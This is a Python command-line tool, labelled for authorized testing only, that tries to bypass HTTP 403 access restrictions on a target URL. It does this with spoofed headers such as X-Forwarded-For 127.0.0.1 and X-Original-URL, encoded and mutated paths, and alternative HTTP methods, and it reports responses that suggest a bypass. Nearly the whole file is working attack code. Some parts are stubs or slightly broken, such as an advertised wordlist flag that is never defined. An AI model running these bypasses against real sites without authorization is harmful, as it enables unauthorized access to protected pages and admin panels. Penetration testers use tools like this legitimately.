#!/usr/bin/env python3
"""
403 Bypass Testing Tool - For authorized security testing only.
Usage: python3 bypass403.py -u https://target.com/admin -w wordlist.txt
"""

import argparse
import requests
import urllib3
from urllib.parse import urlparse, quote
import sys
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ANSI colors
G = "\033[92m"   # green
R = "\033[91m"   # red
Y = "\033[93m"   # yellow
C = "\033[96m"   # cyan
B = "\033[94m"   # blue
X = "\033[0m"    # reset

BANNER = f"""{C}
╔══════════════════════════════════════════════╗
║        403 BYPASS TESTING TOOL               ║
║        For Authorized Testing Only           ║
╚══════════════════════════════════════════════╝
{X}"""


def parse_url(url):
    """Normalize URL and extract parts."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    p = urlparse(url)
    return {
        "full": url,
        "scheme": p.scheme,
        "host": p.netloc,
        "path": p.path or "/",
        "query": ("?" + p.query) if p.query else "",
    }


def send(url, method="GET", headers=None, data=None, allow_redirects=False, timeout=10):
    """Send request and return response or None."""
    try:
        r = requests.request(
            method,
            url,
            headers=headers or {},
            data=data,
            allow_redirects=allow_redirects,
            verify=False,
            timeout=timeout,
        )
        return r
    except requests.exceptions.RequestException as e:
        return None


def baseline(url_info, method="GET"):
    """Get the baseline status code."""
    r = send(url_info["full"], method=method)
    if r is None:
        print(f"{R}[!] Could not reach target.{X}")
        sys.exit(1)
    return r


# ---------- BYPASS TECHNIQUES ----------

def technique_headers(url_info):
    """Try header-based bypasses (X-Forwarded-For, X-Original-URL, etc.)"""
    tests = []

    header_sets = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-For": "localhost"},
        {"X-Forwarded-Host": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Host": "127.0.0.1"},
        {"X-Original-URL": url_info["path"]},
        {"X-Rewrite-URL": url_info["path"]},
        {"X-Override-URL": url_info["path"]},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-Port": "443"},
        {"X-Forwarded-Port": "80"},
        {"Referer": url_info["full"]},
        {"X-Originating-URL": url_info["path"]},
        # Multi-header combos
        {
            "X-Forwarded-For": "127.0.0.1",
            "X-Original-URL": url_info["path"],
        },
    ]

    for h in header_sets:
        tests.append((f"Header: {h}", url_info["full"], "GET", h))

    # X-Original-URL as path override (root request with header)
    root = f"{url_info['scheme']}://{url_info['host']}/"
    for hdr in ("X-Original-URL", "X-Rewrite-URL", "X-Override-URL"):
        tests.append((f"{hdr} override (root)", root, "GET", {hdr: url_info["path"]}))

    return tests


def technique_path_mutations(url_info):
    """Try path-based bypasses (trailing chars, encodings, etc.)."""
    tests = []
    base = f"{url_info['scheme']}://{url_info['host']}"
    path = url_info["path"].rstrip("/")
    if not path:
        path = ""

    mutations = [
        ("Trailing slash", f"{path}/"),
        ("Double slash", f"{path}//"),
        ("Trailing dot", f"{path}/."),
        ("Trailing ..;/", f"{path}/..;/"),
        ("Trailing %20", f"{path}%20"),
        ("Trailing %09 (tab)", f"{path}%09"),
        ("Trailing %00 (null)", f"{path}%00"),
        ("Trailing ?", f"{path}?"),
        ("Trailing #", f"{path}#"),
        ("Trailing ?.css", f"{path}?.css"),
        ("Append .json", f"{path}.json"),
        ("Append /", f"{path}/"),
        ("Append ;/", f"{path};/"),
        ("Append /..;/", f"{path}/..;/"),
        ("Append %2e (dot)", f"{path}%2e"),
        ("Append %2f (slash)", f"{path}%2f"),
        ("Append %2e%2e%2f", f"{path}%2e%2e%2f"),
        ("Append ..%2f", f"{path}..%2f"),
        ("Append %252f", f"{path}%252f"),
        ("Append ..%252f", f"{path}..%252f"),
        ("Uppercase path", path.upper() if path else "/"),
        ("URL-encode one char", path.replace("/", "%2f", 1) if path else "/"),
        ("Double-encode slash", path.replace("/", "%252f", 1) if path else "/"),
        ("Semicolon trick", f"{path}/;/"),
        ("Dot segment", f"{path}/./"),
        ("Random case on last seg", "/".join(
            [s.upper() if i == len(path.split('/'))-1 else s
             for i, s in enumerate(path.split('/'))]
        ) if path else "/"),
    ]

    seen = set()
    for name, m in mutations:
        full = base + m
        if full in seen:
            continue
        seen.add(full)
        tests.append((name, full, "GET", {}))

    return tests


def technique_methods(url_info):
    """Try different HTTP methods."""
    tests = []
    methods = ["POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE",
               "CONNECT", "PROPFIND", "FOO", "DEBUG"]
    for m in methods:
        tests.append((f"Method: {m}", url_info["full"], m, {}))
    return tests


def technique_protocol_version(url_info):
    """HTTP/1.0 and other protocol tricks (need raw socket)."""
    import socket
    tests = []
    # We'll handle these separately as raw requests
    return tests


def raw_http_request(host, port, request_bytes, timeout=10):
    """Send a raw HTTP request via socket."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.sendall(request_bytes)
        data = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(data) > 65536:
                break
        s.close()
        return data
    except Exception:
        return None


def technique_raw(url_info):
    """Raw protocol-level bypasses."""
    results = []
    host = url_info["host"].split(":")[0]
    port = 443 if url_info["scheme"] == "https" else 80
    path = url_info["path"]

    # Note: for HTTPS we'd need SSL; for simplicity testing on HTTP targets
    if url_info["scheme"] == "https":
        import ssl
        def ssl_connect():
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((host, port))
            return ctx.wrap_socket(s, server_hostname=host)
    else:
        def ssl_connect():
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((host, port))
            return s

    # We won't go deep here — the header + path techniques cover most real bypasses
    return results


# ---------- RUNNER ----------

def analyze_response(resp, baseline_status, baseline_len):
    """Determine if a bypass likely worked."""
    if resp is None:
        return None, "err"
    code = resp.status_code
    length = len(resp.content)
    if code in (200, 201, 202, 204, 301, 302, 307, 308):
        # Could be a bypass OR a redirect to login — flag it
        if code in (200, 201, 202, 204):
            return code, "possible-bypass"
        return code, "redirect"
    if code == 401:
        return code, "auth-required"
    if code == 403:
        return code, "still-403"
    if code == 404:
        return code, "not-found"
    if code >= 500:
        return code, "server-error"
    return code, "other"


def run(url, wordlist=None, methods=True, headers=True, paths=True, delay=0):
    url_info = parse_url(url)
    print(BANNER)
    print(f"{B}[*] Target:{X} {url_info['full']}")

    base_resp = baseline(url_info)
    base_status = base_resp.status_code
    base_len = len(base_resp.content)
    print(f"{B}[*] Baseline:{X} {base_status} ({base_len} bytes)")
    print(f"{C}{'-'*70}{X}")

    if base_status != 403:
        print(f"{Y}[!] Warning: baseline is not 403 (it's {base_status}). "
              f"Results may not be meaningful.{X}")
        print(f"{Y}    If your target returns 200 already, there's nothing to bypass.{X}\n")

    all_tests = []
    if headers:
        all_tests += technique_headers(url_info)
    if paths:
        all_tests += technique_path_mutations(url_info)
    if methods:
        all_tests += technique_methods(url_info)

    findings = []
    for i, (name, turl, method, hdrs) in enumerate(all_tests, 1):
        print(f"{C}[{i}/{len(all_tests)}]{X} {name:<35} -> ", end="", flush=True)
        resp = send(turl, method=method, headers=hdrs)
        if resp is None:
            print(f"{R}FAILED{X}")
            continue
        code, verdict = analyze_response(resp, base_status, base_len)
        length = len(resp.content)
        color = G if verdict == "possible-bypass" else (Y if verdict == "redirect" else R)
        print(f"{color}{code}{X} ({length}b) - {verdict}")

        if verdict == "possible-bypass":
            findings.append({
                "technique": name,
                "url": turl,
                "method": method,
                "headers": hdrs,
                "status": code,
                "length": length,
            })

        if delay:
            time.sleep(delay)

    # Summary
    print(f"\n{C}{'='*70}{X}")
    print(f"{B}SUMMARY{X}")
    print(f"{C}{'='*70}{X}")
    if not findings:
        print(f"{R}[x] No obvious bypasses found. Try different techniques or "
              f"consider that the resource may be protected by WAF rules.{X}")
    else:
        print(f"{G}[+] Potential bypasses ({len(findings)}):{X}")
        for f in findings:
            print(f"\n  {G}► {f['technique']}{X}")
            print(f"    URL:    {f['url']}")
            print(f"    Method: {f['method']}")
            if f['headers']:
                print(f"    Headers: {f['headers']}")
            print(f"    Response: {f['status']} ({f['length']} bytes)")
        print(f"\n{Y}[!] Verify manually — some 200s may be soft-404 or login pages.{X}")

    return findings


def main():
    ap = argparse.ArgumentParser(
        description="403 Bypass Testing Tool (authorized testing only)"
    )
    ap.add_argument("-u", "--url", required=True, help="Target URL (e.g., https://site.com/admin)")
    ap.add_argument("--no-methods", action="store_true", help="Skip HTTP method tests")
    ap.add_argument("--no-headers", action="store_true", help="Skip header tests")
    ap.add_argument("--no-paths", action="store_true", help="Skip path mutation tests")
    ap.add_argument("--delay", type=float, default=0, help="Delay between requests (s)")
    args = ap.parse_args()

    run(
        args.url,
        methods=not args.no_methods,
        headers=not args.no_headers,
        paths=not args.no_paths,
        delay=args.delay,
    )


if __name__ == "__main__":
    main()
